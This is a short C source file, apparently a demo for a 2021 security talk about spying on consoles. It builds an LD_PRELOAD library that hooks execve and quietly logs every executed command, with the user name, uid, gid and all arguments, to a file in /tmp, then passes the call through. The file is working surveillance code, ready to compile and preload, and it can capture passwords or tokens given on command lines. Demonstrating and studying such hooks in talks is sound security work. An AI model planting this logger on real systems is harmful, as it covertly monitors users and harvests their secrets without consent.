/**
 * Example for ZN2021 talk: 8 ways to spy your consoles
 * Usage: gcc -fPIC -shared -o spy.so spy.c
 * LD_PRELOAD=$(pwd)/spy.so bash
 * look at /tmp/spy_commands.log
 *
**/
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <dlfcn.h>

int execve (const char *path, char *const argv[], char *const envp[]) {
  int fd, i;
  char username[256];
  if(getlogin_r(username, sizeof(username)) < 0) {
    perror("getlogin_r"); // for debug
    goto out;
  }
  fd = open("/tmp/spy_commands.log", O_CREAT|O_WRONLY|O_APPEND, 0600);
  if(fd < 0) {
    perror("open"); // for debug
    goto out;
  }
  dprintf(fd, "[%s:%d:%d] exec %s ( ", username, getuid(), getgid(), path);
  for(i = 0; argv[i]; i++) {
    dprintf(fd, "%s, ", argv[i]);
  }
  dprintf(fd, ") \n");
  close(fd);

out:
  return (*(int (*)(const char *, char *const [], char *const []))dlsym(RTLD_NEXT, "execve"))(path,argv,envp);

}

